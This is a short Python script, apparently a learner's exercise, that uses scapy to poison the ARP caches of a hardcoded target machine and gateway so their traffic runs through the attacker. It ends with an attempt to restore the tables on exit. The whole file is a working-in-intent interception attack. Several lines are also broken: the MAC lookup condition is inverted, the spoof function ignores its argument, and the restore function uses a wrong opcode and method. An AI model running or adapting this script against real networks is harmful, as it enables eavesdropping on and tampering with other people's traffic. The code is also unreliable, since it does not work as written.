#!usr/bin/env python3

import time
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #A packet that asks a specific IP 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #This will create a ether object and store an instance in variable boradcast 
    arp_request_boradcast = broadcast/arp_request #appending our 2 packtes using / 
    answered_list = scapy.srp(arp_request_boradcast, timeout=1, verbose = False)[0] #sr is function of sending & receiving 
    #while srp actually allows custom ether
    if answered_list == "":
        return (answered_list[0][1].hwsrc)

def spoof(tartget_ip, spoof_ip): #spoof_ip = IP we're pretending to be 
    tartget_mac = get_mac(tartget_ip)
    packet = scapy.ARP(op = 2,pdst = tartget_ip, hwdst = tartget_mac, psrc = "192.168.0.1") 
    #By default op is 1(arp request), setting it to 2 will create an ARP response 
    scapy.send(packet, verbose = False)
#print(packet.show())
#print(packet.summary()

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_ip #Previously scapy was by default sending the source_ip as our ip
    source_mac = get_mac(source_ip) #Getting source mac, manually setting this 
    packet = scapy.ARP(op =3, pdst=destination_ip, hwdst= destination_mac, psrc = source_ip, hwsrc = source_mac)
    packet.send(packet, count = 4, verbose = False )

target_ip = "192.168.0.103"
gateway_ip = "192.168.0.1"

try:     #This will kepp running the block of code until the exception error happens 
    sent_packets_count = 0 #Integer  
    while True:
        spoof(target_ip, gateway_ip) #Telling the target_comp that we're the router 
        spoof(gateway_ip, target_ip) #Telling the router that this is the target_computer 
        sent_packets_count = sent_packets_count + 2 
        print("\r >> Sent packet Count: " + str(sent_packets_count), end = "") #String and num cannot be concatenated 
        #This help python to not start with new line and not to store it in the buffer
        time.sleep(2)
except KeyboardInterrupt:
    print("Detected Crtl + C ..... Quiting! Restoring mac address")
    restore(target_ip , gateway_ip)
    restore(gateway_ip , target_ip)
